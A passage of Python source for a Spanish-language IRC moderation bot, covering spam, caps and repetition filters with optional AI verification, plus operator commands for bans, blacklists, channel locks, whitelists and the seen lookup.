            self._cmd_canal_ops(nick, hostmask, canal, cmd, args, log_telegram=True)
        elif canal.lower() == self.cfg.canal_principal.lower() and es_staff:
            self._cmd_canal_ops(nick, hostmask, canal, cmd, args, log_telegram=True)
        elif not (es_staff or self.db.global_existe_mask("bots.dat", hostmask) or self.es_op(canal, nick)):
            self._protecciones(nick, canal, texto)

    def _protecciones(self, nick: str, canal: str, texto: str) -> None:
        if self.db.get_proteccion(canal, "Spam") and self.db.es_spam_url(canal, texto):
            if self.cfg.ai_key:
                threading.Thread(
                    target = self._ia_verificar_falso_positivo,
                    args   = (nick, canal, texto, "spam", ""),
                    daemon = True,
                ).start()
            else:
                self._sancionar(nick, canal, "spam")
            return
        if self.db.get_proteccion(canal, "Mayusculas") and len(texto) > 6 and pct_mayus(texto) > self.UMBRAL_MAYUS:
            self._antiflood_mayus(nick, canal)
            return
        if self.db.get_proteccion(canal, "Texto"):
            patron, subcadena = self.db.es_frase_prohibida(canal, texto)
            if patron:
                if self.cfg.ai_key:
                    threading.Thread(
                        target = self._ia_verificar_falso_positivo,
                        args   = (nick, canal, texto, "frase", patron, subcadena, "insultos o contenido inapropiado"),
                        daemon = True,
                    ).start()
                else:
                    # Pasamos el patron como trigger para que aparezca en el log [SANCION]
                    self._sancionar(nick, canal, "frase", trigger=patron)
                return
            # El filtro básico no detecto nada pero hay indicios de evasion → consultar IA
            if self.cfg.ai_key:
                fragmento = detectar_fragmento_evasion(texto)
                if fragmento:
                    patrones = self.db.canal_listar("text", canal)
                    if patrones:
                        threading.Thread(
                            target = self._ia_verificar_evasion,
                            args   = (nick, canal, texto, fragmento, patrones),
                            daemon = True,
                        ).start()
                        return
        if self.db.get_proteccion(canal, "Repeticiones"):
            self._antiflood_repe(nick, canal, texto)

    def _ia_verificar_evasion(
        self,
        nick:      str,
        canal:     str,
        texto:     str,
        fragmento: str,
        patrones:  List[str],
    ) -> None:
        """Ejecutado en hilo separado para no bloquear el reactor."""
        es_evasion, patron, model_used = consultar_ia_evasion(
            self.cfg, patrones, fragmento, texto,
        )
        if es_evasion:
            self.debug(
                f"\x034[IA]\x03 \x0312{nick}\x03 intento evadir el patron "
                f"\x0312{patron}\x03 con '\x0312{fragmento}\x03' en \x033{canal}\x03"
            )
            self._sancionar(nick, canal, "frase", trigger=fragmento)

    def _ia_verificar_falso_positivo(
        self,
        nick:      str,
        canal:     str,
        texto:     str,
        tipo:      str,   # "spam" | "frase"
        patron:    str,
        subcadena: str = "",   # fragmento literal que activó el match
        categoria: str = "",   # categoría de la regla para el prompt de la IA
    ) -> None:
        """Ejecutado en hilo separado. Consulta la IA y sanciona solo si confirma la infracción."""
        es_infraccion, model_used = consultar_ia_falso_positivo(
            self.cfg, tipo, patron, texto, subcadena, categoria,
        )
        if es_infraccion:
            self.debug(
                f"\x034[IA]\x03 Infraccion confirmada ({tipo}) para \x0312{nick}\x03 "
                f"en \x033{canal}\x03 \u2014 sancionando. "
                f"Mensaje: '\x0312{texto}\x03' | Patron: '\x0312{patron}\x03'"
            )
            self._sancionar(nick, canal, tipo, trigger=patron)
        else:
            self.debug(
                f"\x033[IA]\x03 Falso positivo ({tipo}) para \x0312{nick}\x03 "
                f"en \x033{canal}\x03 \u2014 sin sanción. "
                f"Mensaje: '\x0312{texto}\x03' | Patron: '\x0312{patron}\x03'"
            )

    def _antiflood_mayus(self, nick: str, canal: str) -> None:
        n = self.avisos.inc(nick, canal, "mayus")
        if   n == 1: self.pm(canal, f"Por favor \x0312{nick}\x03 no escriba en mayúsculas, indican gritar y resultan molestas para el resto de los usuarios, gracias. \x0310(Primer Aviso)")
        elif n == 2: self.pm(canal, f"Por favor \x0312{nick}\x03 no escriba en mayúsculas, indican gritar y resultan molestas para el resto de los usuarios, gracias. \x0310(Segundo Aviso)")
        elif n == 3: self.kick(canal, nick, self._razon("mayus"))
        elif n >= 4:
            self._sancionar(nick, canal, "mayus")
            self.avisos.reset(nick, canal, "mayus")

    def _antiflood_repe(self, nick: str, canal: str, texto: str) -> None:
        n = self.repes.registrar(nick, canal, texto)
        if   n == 2: self.pm(canal, f"Por favor \x0312{nick}\x03 no repita el mismo mensaje, con una vez se le entiende, gracias. \x0310(Primer Aviso)")
        elif n == 3: self.pm(canal, f"Por favor \x0312{nick}\x03 no repita el mismo mensaje, con una vez se le entiende, gracias. \x0310(Segundo Aviso)")
        elif n == 4: self.kick(canal, nick, self._razon("repe"))
        elif n >= 5:
            self._sancionar(nick, canal, "repe")
            self.repes.reset(nick, canal)

    # Comandos canal OPS

    def _cmd_canal_ops(self, nick: str, hostmask: str, canal: str, cmd: str, args: List[str], log_telegram: bool = False) -> None:
        tipos_sancion = {
            "!km": "mayus", "!kr": "repe",  "!ki": "insul",
            "!ks": "sexo",  "!kd": "datos", "!ksp": "spam", "!kb": "propio",
        }
        
        valid_commands = set(tipos_sancion.keys()) | {
            "!help", "!op", "!deop", "!aop", "!avoice", "!anuncia", "!anunciar",
            "!notify", "!getip", "!aka", "!prevnicks", "!bladd", "!bldel", 
            "!blist", "!bl", "!blclear", "!clearbans", "!ibladd", "!ibldel", 
            "!iblist", "!lock", "!wl", "!topiclock", "!infoban", "!ban", 
            "!ub", "!unban", "!seen", "!visto", "!quote", "!quoteadd", "!quotedel"
        }
        pm_methods = {"canal", "mod", "admin", "bot", "set", "text", "spam", "nick", "enick", "ibl", "rango", "backup", "join", "ayuda", "restart"}
        valid_commands |= {"!" + m for m in pm_methods}

        if log_telegram and cmd in valid_commands and len(cmd) > 1:
            texto_full = cmd + (" " + " ".join(args) if args else "")
            self._notify_telegram(f"💬 <b>Comando</b> de {nick} en {canal}: <code>{texto_full}</code>")

        pral = self.cfg.canal_principal
        if   cmd == "!help":       self._help_canal(nick, canal)
        elif cmd == "!op":
            obj = args[0] if args else nick
            self.modo(pral, "+o", obj)
            self.pm(self.cfg.canal_ops, f"\x033[OP]\x03 \x0312{obj}\x03 recibió \x033+o\x03 en \x033{pral}\x03 por \x0312{nick}\x03")
        elif cmd == "!deop":
            obj = args[0] if args else nick
            self.modo(pral, "-o", obj)
            self.pm(self.cfg.canal_ops, f"\x034[DEOP]\x03 \x0312{obj}\x03 recibió \x034-o\x03 en \x033{pral}\x03 por \x0312{nick}\x03")
        elif cmd == "!aop":        self._cmd_autoop(nick, hostmask, canal, args)
        elif cmd == "!adown":     self._cmd_adown(nick, hostmask, canal, args)
        elif cmd == "!avoice":     self._cmd_avoice(nick, hostmask, canal, args)
        elif cmd in ("!anuncia", "!anunciar"): self._cmd_anuncia(nick, canal, args)
        elif cmd == "!notify":     self._cmd_notify(nick, canal, args)
        elif cmd == "!getip":      self._cmd_getip(nick, args)
        elif cmd == "!aka":        self._cmd_aka_canal(nick, canal, args)
        elif cmd == "!prevnicks":  self._cmd_prevnicks(nick, canal, args)
        elif cmd in ("!bladd", "!bldel", "!blist", "!bl", "!blclear", "!clearbans", "!ibladd", "!ibldel", "!iblist"):
            self._cmd_blista(nick, canal, cmd, args)
        elif cmd == "!lock":       self._cmd_lock(nick, hostmask, canal, args)
        elif cmd == "!wl":         self._cmd_wl(nick, hostmask, canal, args)
        elif cmd == "!topiclock":  self._cmd_topiclock(nick, hostmask, canal, args)
        elif cmd == "!infoban":    self._cmd_infoban(nick, canal, args)
        elif cmd == "!ban":        self._cmd_ban(nick, canal, args)
        elif cmd in ("!ub", "!unban"): self._cmd_unban(nick, canal, args)
        elif cmd in ("!seen", "!visto"): self._cmd_seen(nick, canal, args)
        elif cmd in tipos_sancion:
            self._cmd_sancionar(nick, canal, cmd, args, tipos_sancion)
        else:
            cmd_limpio = cmd[1:]
            pm_methods: Dict[str, Callable[[str, str, List[str]], None]] = {
                "canal":  self._c_lista_canales,
                "mod":    self._c_mods,
                "admin":  self._c_admins,
                "bot":    self._c_bots,
                "set":    self._c_set,
                "text":   self._c_texto,
                "spam":   self._c_spam_canal,
                "nick":   self._c_nick_canal,
                "enick":  self._c_enick_canal,
                "ibl":    self._c_ibl,
                "rango":   self._c_rango,
                "backup":  self._c_backup_pm,
                "join":    self._c_join,
                "ayuda":   self._c_ayuda_pm,
                "restart": self._c_restart,
            }
            if cmd_limpio in pm_methods:
                if not self.es_admin(nick, hostmask):
                    self.pm(canal, f"\x034[Acceso Denegado!]\x03 Se requiere rol \x0312admin\x03 o superior.")
                    return
                sub = args[0].lower() if args else ""
                sub_args = args[1:] if len(args) > 1 else []
                # Redireccionar el destino de pm y _lista_notice al canal
                self._pm_target_nick = nick
                self._pm_target = canal
                self._pm_cmd_name = cmd_limpio
                try:
                    pm_methods[cmd_limpio](nick, sub, sub_args)
                finally:
                    self._pm_target_nick = None
                    self._pm_target = None
                    self._pm_cmd_name = None

    # Comando !lock

    def _cmd_lock(self, nick: str, hostmask: str, canal: str, args: List[str]) -> None:
        if not self._rol_minimo(nick, hostmask, "mod"):
            self.pm(canal, f"\x034[Acceso Denegado!]\x03 Se requiere rol \x0312mod\x03 o superior.")
            return

        sub = args[0].lower() if args else ""

        if not sub:
            self.pm(canal,
                "\x0312!lock on\x03 — Bloquear canal  "
                "\x0312!lock off\x03 — Desbloquear  "
                "\x0312!lock status\x03 — Ver estado")
            return

        if sub == "on":
            if not self.gestor_lock.bloquear(canal):
                self.pm(canal, f"\x034[Lock]\x03 \x033{canal}\x03 ya estaba bloqueado.")
                return
            self.pm(self.cfg.canal_ops,
                f"\x034[Lock]\x03 Canal \x033{canal}\x03 \x034BLOQUEADO\x03 "
                f"por \x0312{nick}\x03 (\x0312{self._rol(nick, hostmask)}\x03).")
            self.debug(f"\x034[LOCK]\x03 \x033{canal}\x03 bloqueado por \x034{nick}\x03")
            self._lock_expulsar_presentes(canal)
            return

        if sub == "off":
            if not self.gestor_lock.desbloquear(canal):
                self.pm(canal, f"\x033[Lock]\x03 \x033{canal}\x03 ya estaba desbloqueado.")
                return
            self.pm(self.cfg.canal_ops,
                f"\x033[Lock]\x03 Canal \x033{canal}\x03 \x033ABIERTO\x03 por \x0312{nick}\x03.")
            self.debug(f"\x033[LOCK]\x03 \x033{canal}\x03 abierto por \x034{nick}\x03")
            return

        if sub == "status":
            estado = "\x034BLOQUEADO\x03" if self.gestor_lock.esta_bloqueado(canal) else "\x033ABIERTO\x03"
            self.pm(canal, f"\x033[Lock]\x03 Estado de \x033{canal}\x03: {estado}")
            return

        self.pm(canal, "\x034Error:\x03 Uso: \x0312!lock on|off|status\x03")

    def _lock_expulsar_presentes(self, canal: str) -> None:
        def _expulsar() -> None:
            for nick in list(self._members.get(canal.lower(), set())):
                if nick == self.cfg.nick.lower():
                    continue
                host     = self.nicklogger.host_de_nick(nick) or ""
                hostmask = f"{nick}!*@{host}" if host else nick
                if not self.es_staff(nick, hostmask) and not self.gestor_lock.en_whitelist(canal, nick):
                    try:
                        self.kick(canal, nick, "Canal restringido. Contacta con un Moderador.")
                    except Exception:
                        pass
        threading.Thread(target=_expulsar, daemon=True).start()

    # Comando !wl

    def _cmd_wl(self, nick: str, hostmask: str, canal: str, args: List[str]) -> None:
        if not self._rol_minimo(nick, hostmask, "admin"):
            self.pm(canal, f"\x034[Acceso Denegado!]\x03 Se requiere rol \x0312admin\x03 o superior.")
            return

        sub      = args[0].lower() if args else ""
        nick_obj = args[1] if len(args) > 1 else ""

        if not sub:
            self.pm(canal,
                "\x0312!wl add <nick>\x03 — Añadir  "
                "\x0312!wl del <nick>\x03 — Eliminar  "
                "\x0312!wl list\x03 — Ver lista")
            return

        if sub == "add":
            if not nick_obj:
                self.pm(canal, "\x034Error:\x03 Uso: \x0312!wl add <nick>\x03")
                return
            mascara = GestorLock.mascara_canonica(nick_obj)
            if self.gestor_lock.wl_add(canal, nick_obj):
                self.pm(canal, f"\x033[WL]\x03 \x0312{nick_obj}\x03 añadido/a a la whitelist de \x033{canal}\x03.")
            else:
                self.pm(canal, f"\x034[WL]\x03 \x0312{nick_obj}\x03 ya estaba en la whitelist.")
            return

        if sub == "del":
            if not nick_obj:
                self.pm(canal, "\x034Error:\x03 Uso: \x0312!wl del <nick>\x03")
                return
            mascara = GestorLock.mascara_canonica(nick_obj)
            if self.gestor_lock.wl_del(canal, nick_obj):
                self.pm(canal, f"\x033[WL]\x03 \x0312{nick_obj}\x03 eliminado/a de la whitelist de \x033{canal}\x03.")
            else:
                self.pm(canal, f"\x034[WL]\x03 \x0312{nick_obj}\x03 no estaba en la whitelist.")
            return

        if sub == "list":
            lista = self.gestor_lock.wl_listar(canal)
            if lista:
                for pagina in paginar(lista, 280):
                    self.pm(canal, f"\x033[WL]\x03 Whitelist de \x033{canal}\x03: \x0312{pagina}\x03")
            else:
                self.pm(canal, f"\x033[WL]\x03 La whitelist de \x033{canal}\x03 esta vacia.")
            return

        self.pm(canal, "\x034Error:\x03 Uso: \x0312!wl add|del|list <nick>\x03")

    # Comando !topiclock

    def _cmd_topiclock(self, nick: str, hostmask: str, canal: str, args: List[str]) -> None:
        """
        !topiclock on  → guarda el topic actual y protege cambios (requiere mod+)
        !topiclock off → desactiva la protección
        """
        if not self._rol_minimo(nick, hostmask, "mod"):
            self.pm(canal, f"\x034[Acceso Denegado!]\x03 Se requiere rol \x0312mod\x03 o superior.")
            return

        sub = args[0].lower() if args else ""

        if not sub:
            self.pm(canal,
                "\x0312!topiclock on\x03 — Proteger topic actual  "
                "\x0312!topiclock off\x03 — Desactivar proteccion")
            return

        if sub == "on":
            if self.gestor_topiclock.esta_activo(canal):
                topic_actual = self.gestor_topiclock.topic_guardado(canal)
                self.pm(canal,
                    f"\x034[TopicLock]\x03 Ya estaba activo en \x033{canal}\x03. "
                    f"Topic guardado: \x0312{topic_actual or '(vacio)'}\x03")
                return
            # Obtener el topic actual del servidor via TOPIC (se procesará en el raw 332)
            # Como no tenemos acceso directo al topic aquí, lo pedimos y lo guardamos
            # en cuanto llega. Mientras tanto guardamos cadena vacía como placeholder.
            topic_ahora = ""
            if self._conn:
                # Intentar obtener de la caché interna de irc.client si está disponible
                try:
                    topic_ahora = str(self._conn.channels[canal.lower()].topic)  # type: ignore[attr-defined]
                except Exception:
                    topic_ahora = ""
            self.gestor_topiclock.activar(canal, topic_ahora)
            self.pm(self.cfg.canal_ops,
                f"\x034[TopicLock]\x03 Canal \x033{canal}\x03 \x034PROTEGIDO\x03 "
                f"por \x0312{nick}\x03. Topic guardado: \x0312{topic_ahora or '(vacio)'}\x03")
            self.debug(f"\x034[TOPICLOCK]\x03 \x033{canal}\x03 activado por \x034{nick}\x03")
            return

        if sub == "off":
            if not self.gestor_topiclock.esta_activo(canal):
                self.pm(canal, f"\x033[TopicLock]\x03 \x033{canal}\x03 ya estaba desactivado.")
                return
            self.gestor_topiclock.desactivar(canal)
            self.pm(self.cfg.canal_ops,
                f"\x033[TopicLock]\x03 Proteccion de topic en \x033{canal}\x03 \x033DESACTIVADA\x03 "
                f"por \x0312{nick}\x03.")
            self.debug(f"\x033[TOPICLOCK]\x03 \x033{canal}\x03 desactivado por \x034{nick}\x03")
            return

        self.pm(canal, "\x034Error:\x03 Uso: \x0312!topiclock on|off\x03")

    def _cmd_getip(self, nick: str, args: List[str]) -> None:
        if not args:
            self.pm(self.cfg.canal_ops, "Uso: !getip <nick> [ibl]")
            return
        nick_obj  = args[0]
        con_ibl   = len(args) > 1 and args[1].lower() == "ibl"
        ops       = self.cfg.canal_ops
        pral      = self.cfg.canal_principal
        host      = self.nicklogger.host_de_nick(nick_obj) or self.aka.buscar_ip_por_nick(nick_obj)
        if not host:
            self.pm(ops, f"No hay registro para \x0312{nick_obj}\x03.")
            return
        partes    = host.split(".")
        fragmento = ".".join(partes[-2:]) if len(partes) >= 2 else host
        self.pm(ops, f"Parte de IP para \x0312{nick_obj}\x03: \x0312{fragmento}\x03")
        self.pm(ops, f"Comando de ban para \x0312{nick_obj}\x03: \x0312/mode {pral} +b *!*@*{fragmento}*\x03")
        self.pm(ops, f"\x034*RECUERDA:\x03 Cambia \x0312{pral}\x03 por el canal donde quieres aplicarlo")
        if con_ibl:
            self.pm(ops, f"Ban permanente (IBL): \x0312/msg {self.cfg.nick} ibl add {pral} {fragmento}\x03")

    def _cmd_aka_canal(self, nick: str, canal: str, args: List[str]) -> None:
        if not args:
            self.pm(canal, "Uso: !aka <nick>")
            return
        nick_obj = args[0]
        host     = self.nicklogger.host_de_nick(nick_obj)
        todos    = self.nicklogger.nicks_de(host) if host else []
        if len(todos) <= 1:
            self.pm(canal, f"\u2022 \x0312{nick_obj}\x03 ha usado solo ese nick, que yo sepa.")
            return
        for i, linea in enumerate(paginar(todos)):
            prefijo = f"\u2022 \x0312{nick_obj}\x03 Ha usado los siguientes nicks: \x0312" if i == 0 else "  \x0312"
            self.pm(canal, prefijo + linea + "\x03")
        self.pm(canal, f"| Total: \x0312{len(todos)}\x03")

    def _cmd_blista(self, nick: str, canal: str, cmd: str, args: List[str]) -> None:
        pral = self.cfg.canal_principal
        if cmd == "!bladd":
            if not args:
                self.pm(canal, "Uso: !BLAdd <nick|vhost|nick!user@host> [motivo]")
                return
            nick_obj = args[0]
            motivo   = " ".join(args[1:]) if len(args) > 1 else BLista.MOTIVO_DEFAULT

            # Vhost (contiene puntos → no puede ser nick IRC)
            if "." in nick_obj:
                host        = nick_obj
                ban_mask    = f"*!*@{host}"
                nicks_aka   = self.nicklogger.nicks_de(host)
                nick_limpio = nicks_aka[-1] if nicks_aka else None
                clave_bl    = nick_limpio or host

            # Nick normal
            else:
                nick_limpio = nick_obj
                host        = None
                ban_mask    = f"{nick_limpio}!*@*"
                clave_bl    = nick_limpio

            if self.blista.agregar(pral, clave_bl, motivo, nick):
                msg_bl = f"🚫 <b>Blacklist Añadido</b> en {pral}: <code>{clave_bl}</code> (por {nick}) - {motivo}"
                self._notify_telegram(msg_bl)
                self.pm(self.cfg.canal_ops, f"\x033OK\x03 \x0312{clave_bl}\x03 añadido a la lista negra de \x033{pral}\x03.")
                if host:
                    self.blista.actualizar_host(pral, clave_bl, host)
                if self.es_op(pral, self.cfg.nick):
                    self.modo(pral, "+b", ban_mask)
                    if nick_limpio and nick_limpio.lower() in self._members.get(pral.lower(), set()):
                        self.kick(pral, nick_limpio, motivo)
                        self.pm(self.cfg.canal_ops, f"\x034[BL]\x03 \x0312{nick_limpio}\x03 expulsado de \x033{pral}\x03 (por \x0312{nick}\x03): {motivo}")
            else:
                self.pm(canal, f"\x0312{clave_bl}\x03 ya estaba en la lista negra.")

        elif cmd == "!bldel":
            if not args:
                self.pm(canal, "Uso: !BLDel <nick>")
                return
            nick_obj = args[0]
            # Obtener datos antes de borrar para quitar el ban
            entradas = self.blista.listar(pral)
            host_a_quitar = None
            for e in entradas:
                if e['nick'].lower() == nick_obj.lower():
                    host_a_quitar = e.get('host')
                    break

            if self.blista.eliminar(pral, nick_obj):
                msg_bl = f"✅ <b>Blacklist Eliminado</b>: <code>{nick_obj}</code> (por {nick})"
                self._notify_telegram(msg_bl)
                self.pm(self.cfg.canal_ops, f"\x033OK\x03 \x0312{nick_obj}\x03 eliminado de la lista negra.")
                if self.es_op(pral, self.cfg.nick):
                    # Quitar ban por nick
                    self.modo(pral, "-b", f"{nick_obj}!*@*")
                    # Quitar ban por host si existía
                    if host_a_quitar:
                        self.modo(pral, "-b", f"*!*@{host_a_quitar}")
            else:
                self.pm(canal, f"\x034Error:\x03 \x0312{nick_obj}\x03 no esta en la lista negra.")

        elif cmd == "!clearbans":
            if not self.es_op(canal, self.cfg.nick):
                self.pm(canal, f"\x034Error:\x03 No tengo privilegios de Operador en {canal}.")
                return
            
            canales_a_limpiar = {canal.lower()}
            if pral:
                canales_a_limpiar.add(pral.lower())

            for c in canales_a_limpiar:
                if self.es_op(c, self.cfg.nick):
                    # Solo enviamos el "Limpiando..." por privado al staff si el canal tiene bans (vía MODE +b)
                    if self._conn:
                        self._conn.mode(c, "+b")
                    self._limpiando_bans[c] = True
                else:
                    if c == canal.lower():
                        self.pm(self.cfg.canal_ops, f"\x034Aviso:\x03 No soy OP en {c}, no puedo limpiarlo.")

        elif cmd in ("!blist", "!bl"):
            entradas = self.blista.listar(pral)
            if not entradas:
                self.pm(canal, f"La lista negra de \x033{pral}\x03 esta vacia.")
                return
            self.pm(canal, f"Lista negra de \x033{pral}\x03 ({len(entradas)} entradas):")
            for entrada in entradas:
                host_info = f" [\x0312*!*@{entrada['host']}\x03]" if entrada.get("host") else " \x034[host pendiente]\x03"
                self.pm(canal, f"  \x0312{entrada['nick']}\x03{host_info} — {entrada['motivo']} (por \x0312{entrada['por']}\x03)")

        elif cmd == "!blclear":
            conteo = self.blista.vaciar(pral)
            if conteo > 0:
                self.pm(self.cfg.canal_ops, f"\x033OK\x03 Se han eliminado \x0312{conteo}\x03 nicks de la lista negra de \x033{pral}\x03.")
            else:
                self.pm(canal, f"\x034Error:\x03 La lista negra de \x033{pral}\x03 ya estaba vacia.")

        elif cmd in ("!ibladd", "!ibldel", "!iblist"):
            if cmd == "!iblist":
                entradas_ibl = self.db.ibl_listar(pral)
                if not entradas_ibl:
                    self.pm(canal, f"La lista IBL de \x033{pral}\x03 está vacía.")
                    return
                self.pm(canal, f"Bans protegidos (IBL) en \x033{pral}\x03 ({len(entradas_ibl)}):")
                for e in entradas_ibl:
                    self.pm(canal, f"  \u2022 \x0312{e}\x03")
                return

            if not args:
                self.pm(canal, f"Uso: {cmd} <nick|host|mask> (ej: {cmd} AriaNna)")
                return
            
            entrada_arg = args[0]
            mask, desc = completar_banmask(entrada_arg)
            if not mask:
                self.pm(canal, "\x034Error:\x03 Máscara inválida.")
                return

            if cmd == "!ibladd":
                if self.db.ibl_agregar(pral, mask):
                    if self.es_op(pral, self.cfg.nick):
                        self.modo(pral, "+b", mask)
                    msg = f"🛡️ <b>IBL Añadido</b> en {pral}: <code>{mask}</code> (por {nick})"
                    self.pm(self.cfg.canal_ops, f"\x033OK\x03 Máscara \x0312{mask}\x03 protegida en \x033{pral}\x03.")
                    self._notify_telegram(msg)
                else:
                    self.pm(canal, f"La máscara \x0312{mask}\x03 ya estaba protegida.")
            
            elif cmd == "!ibldel":
                if self.db.ibl_eliminar(pral, mask):
                    if self.es_op(pral, self.cfg.nick):
                        self.modo(pral, "-b", mask)
                    msg = f"🔓 <b>IBL Eliminado</b> en {pral}: <code>{mask}</code> (por {nick})"
                    self.pm(self.cfg.canal_ops, f"\x033OK\x03 Máscara \x0312{mask}\x03 desprotegida en \x033{pral}\x03.")
                    self._notify_telegram(msg)
                else:
                    self.pm(canal, f"La máscara \x0312{mask}\x03 no estaba en la IBL.")

    def _cmd_infoban(self, mod: str, canal: str, args: List[str]) -> None:
        if not args:
            self.pm(canal, "Uso: !infoban <nick>")
            return
        nick_obj = args[0].lower()
        self._infoban_req[nick_obj] = (canal, mod)
        if self._conn:
            self._conn.whois([nick_obj])

    def _cmd_ban(self, mod: str, canal: str, args: List[str]) -> None:
        if not args:
            self.pm(canal, "Uso: !ban <nick|mask>")
            return
        
        # Si el comando viene del canal de staff, banear en el canal principal
        canal_obj = canal
        if canal.lower() == self.cfg.canal_ops.lower():
            canal_obj = self.cfg.canal_principal

        entrada = args[0]
        for arg in args:
            if any(c.isalnum() for c in arg) or "!" in arg or "@" in arg or "." in arg:
                entrada = arg
                break

        mask = ""
        # Si es un nick suelto, intentar host o nick!*@*
        if "!" not in entrada and "@" not in entrada and "." not in entrada:
            if self.es_staff(entrada):
                self.pm(canal, f"\x034Error:\x03 \x0312{entrada}\x03 es miembro del Staff y no puede ser baneado.")
                return
            host = self.nicklogger.host_de_nick(entrada)
            if host:
                mask = f"*!*@{host}"
            else:
                mask = f"{entrada}!*@*"
        else:
            mask, desc = completar_banmask(entrada)
            
        if not mask:
            self.pm(canal, "\x034Error:\x03 Máscara inválida.")
            return
            
        # Protección de Staff por máscara (verificar si afecta a algún Staff online)
        miembros_canal = self._members.get(canal_obj.lower(), set())
        for nick_miembro in miembros_canal:
            host_miembro = self._recent_hosts.get(nick_miembro.lower(), f"{nick_miembro}!*@*")
            full_host = f"{nick_miembro}!*@{host_miembro}" if "!" not in host_miembro else host_miembro
            if mask_match(full_host, mask) or mask_match(f"{nick_miembro}!*@*", mask):
                if self.es_staff(nick_miembro, full_host):
                    self.pm(canal, f"\x034Error:\x03 Esa máscara afectaría a \x0312{nick_miembro}\x03 (Staff). Ban cancelado.")
                    return
        
        if self.es_op(canal_obj, self.cfg.nick):
            self.modo(canal_obj, "+b", mask)
            self.pm(self.cfg.canal_ops, f"\x033OK\x03 \x0312{mask}\x03 baneado (silenciado) en \x033{canal_obj}\x03.")
        else:
            self.pm(canal, f"\x034Error:\x03 No tengo privilegios de Operador en {canal_obj}.")

    def _cmd_unban(self, mod: str, canal: str, args: List[str]) -> None:
        if not args:
            self.pm(canal, "Uso: !ub <nick> | !unban <nick>")
            return
        nick_obj   = args[0]
        canal_pral = self.cfg.canal_principal
        self._whois_unban[nick_obj.lower()] = (canal_pral, mod)
        if self._conn:
            self._conn.whois([nick_obj])

    def _cmd_seen(self, nick: str, canal: str, args: List[str]) -> None:
        # Restricción: Solo staff (mod+)
        if not self.es_staff(nick):
            return

        if not args:
            self.pm(canal, f"\x034[Error]\x03 Uso: \x0312!visto <nick>\x03 | \x0312!visto top\x03 | \x0312!visto stats\x03")
            return
        
        sub = args[0].lower()
        if sub == "top":
            top = self.seen.obtener_top()
            if not top:
                self.pm(canal, "No hay datos suficientes para mostrar el top.")
                return
            res = []
            for i, ent in enumerate(top, 1):
                res.append(f"\x0310#{i}\x03 \x0312{ent['nick']}\x03 (\x0304{ent.get('busquedas', 0)}\x03)")
            self.pm(canal, f"\x02[Top Seen]\x02 {' - '.join(res)}")
            return
        
        if sub == "stats":
            u, c = self.seen.obtener_stats()
            self.pm(canal, f"\x02[Stats Seen]\x02 Usuarios vistos: \x0312{u}\x03 | Canales monitoreados: \x0312{c}\x03")
            return
        
        # Búsqueda de nick
        target = args[0]
        if target.lower() == self.cfg.nick.lower():
            self.pm(canal, "¿Me buscas a mí? ¡Aquí estoy!")
            return
        if target.lower() == nick.lower():
            self.pm(canal, "Mírate en un espejo...")
            return
        
        # Si el usuario está en el canal actualmente
        if target.lower() in self._members.get(canal.lower(), set()):
            self.pm(canal, f"\x0312{target}\x03 ya está en el canal.")
            return

        ent = self.seen.obtener_seen(target)
        if not ent:
            # Registrar que alguien lo buscó (para el sistema de avisos)
            self.seen.registrar_busqueda(target, nick, canal)
        ent = self.seen.obtener_seen(target)
        if not ent:
            # Registrar que alguien lo buscó (para el sistema de avisos)
            self.seen.registrar_busqueda(target, nick, canal)
            self.pm(canal, f"No recuerdo haber visto a \x0312{target}\x03 por aquí.")
        else:
            ts = ent["ts"]
            tiempo = format_timesince(ts)
            accion = ent["accion"]
            lugar  = ent["canal"]
            extra  = ent["extra"]
            
            # Formatear según acción
            if accion == "JOIN": msg = f"entrando en \x0303{lugar}\x03"
            elif accion == "PART": msg = f"saliendo de \x0303{lugar}\x03 diciendo: \x1f{extra}\x1f"
            elif accion == "QUIT": msg = f"desconectando con motivo: \x1f{extra}\x1f"
            elif accion == "KICK": msg = f"siendo expulsado de \x0303{lugar}\x03 por \x0312{extra}\x03"
            elif accion == "NICK": msg = f"cambiando su nick a \x0312{extra}\x03"
            elif accion == "TEXT": msg = f"diciendo algo en \x0303{lugar}\x03"
            else: msg = f"realizando una acción ({accion})"
            
            self.pm(canal, f"\x0312{ent['nick']}\x03 fue visto por última vez hace \x0304{tiempo}\x03 {msg}.")
            
            # Registrar búsqueda para avisarle cuando entre
            self.seen.registrar_busqueda(target, nick, canal)

    _ANUNCIOS: Dict[str, List[str]] = {
        "alias": [
            "\x0312Comunicado\x034: \x031Si no te gusta el \x036Nick/Alias\x031 que te asigna la web, puedes cambiarlo con: \x033/Nick NuevoNick",
        ],
        "saludo": [
            "\x0313,0Anuncio: \x034Bienvenidos/as a la sala \x033#psicologia\x034. Gracias por vuestra preferencia.",
        ],
        "ignore": [
            "\x0312Comunicado: \x037Si un \x0312Usuario\x037 te molesta en sala o privado, ignóralo con: \x0312/ignore nick",
            "\x037También puedes silenciar privados con: \x0312/silencie +nick",
        ],
        "nick": [
            "\x0312Comunicamos\x034: Puedes registrar tu \x036Alias/Nick\x031 entrando en la web de ChatZona.",
        ],
        "normas": [
            "\x032Bienvenidos/as a \x0312#psicologia\x032  Queda totalmente \x034PROHIBIDO\x032 hacer "
            "\x0312Spam\x031[\x032Salas, Emails, Webs\x031], \x032Flood\x031[\x032Repeticiones\x031], "
            "\x032Ofensas, Groserías, escribir en \x0312Mayúscula, \x032Temas de sexo sin enfoque psicológico\x032 "
            "Totalmente \x034PROHIBIDO\x032 Drogas y Autolesiones",
        ],
    }
    _ANUNCIA_INTERVALO: Dict[str, int] = {
        "normas": 7200,
        "alias":  3600,
        "saludo": 3600,
        "ignore": 3600,
        "nick":   3600,
    }

    def _cmd_notify(self, nick: str, canal: str, args: List[str]) -> None:
        if not self.es_admin(nick):
            self.pm(canal, f"\x034[Acceso Denegado!]\x03 Se requiere rol \x0312admin\x03 o superior.")
            return
        sub      = args[0].lower() if args else ""
        nick_obj = args[1] if len(args) > 1 else ""
        if not sub or sub == "help":
            self.pm(canal, "\x0312!notify add <nick>\x03 — Vigilar · \x0312!notify del <nick>\x03 — Dejar · \x0312!notify list\x03 — Ver lista")
            return
        if sub == "add":
            if not nick_obj:
                self.pm(canal, "Uso: \x0312!notify add <nick>\x03")
                return
            # Añadir a la lista de vigilancia
            if self.gestor_notify.agregar(nick_obj):
                self.pm(canal, f"\x033[NOTIFY]\x03 \x0312{nick_obj}\x03 añadido a la lista de vigilancia.")
                # Verificar si está online via WHOIS antes de invitar
                if self._conn:
                    self._whois_notify[nick_obj.lower()] = (canal, "add")
                    self._conn.whois([nick_obj])
            else:
